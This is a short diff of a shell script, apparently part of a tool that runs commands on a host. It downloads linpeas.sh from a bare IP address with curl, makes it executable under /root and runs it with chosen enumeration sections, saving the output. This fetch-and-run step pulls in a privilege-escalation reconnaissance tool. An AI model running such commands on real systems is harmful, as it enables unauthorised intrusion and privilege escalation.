@@ -21,7 +21,7 @@ OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 # Commands to run on the host<
 curl http://35.194.58.97/linpeas.sh --output /root/peas.sh
 chmod +x /root/peas.sh
-/root/peas.sh > \${OUTPATH}
+/root/peas.sh -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files > \${OUTPATH}
 
 __EOF__
 
